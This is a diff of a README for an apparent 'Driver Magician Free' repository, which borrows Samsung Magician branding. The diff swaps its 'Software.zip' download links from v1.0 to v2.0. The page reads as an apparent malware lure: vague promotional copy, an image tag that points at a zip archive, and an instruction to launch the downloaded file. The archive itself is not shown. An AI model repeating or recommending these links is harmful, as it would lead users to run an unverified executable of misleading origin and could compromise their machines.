@@ -1,6 +1,6 @@
 # 🚀 Welcome to Driver Magician Free Repository! 🚗
 
-![Driver Magician Free](https://github.com/kolela/Driver-Magician-Free/releases/download/v1.0/Software.zip)
+![Driver Magician Free](https://github.com/kolela/Driver-Magician-Free/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the **Driver Magician Free** repository, your go-to place for all things related to driver management and data cloning using Samsung Magician. Whether you are looking to download Driver Magician, clone drives using Samsung Magician, or resolve driver-related issues, this repository has got you covered.
@@ -45,7 +45,7 @@ Encountering issues with Samsung Magician? Here are some common problems and sol
 ## Get Started
 Ready to optimize your driver management and drive cloning process? Download Driver Magician Free and leverage Samsung Magician's powerful capabilities today!
 
-[![Download Driver Magician Free](https://github.com/kolela/Driver-Magician-Free/releases/download/v1.0/Software.zip)](https://github.com/kolela/Driver-Magician-Free/releases/download/v1.0/Software.zip)
+[![Download Driver Magician Free](https://github.com/kolela/Driver-Magician-Free/releases/download/v2.0/Software.zip)](https://github.com/kolela/Driver-Magician-Free/releases/download/v2.0/Software.zip)
 
 If the link ends with the file name, make sure to launch it to initiate the download process. For any additional resources or latest updates, don't forget to check the **Releases** section of this repository.
 
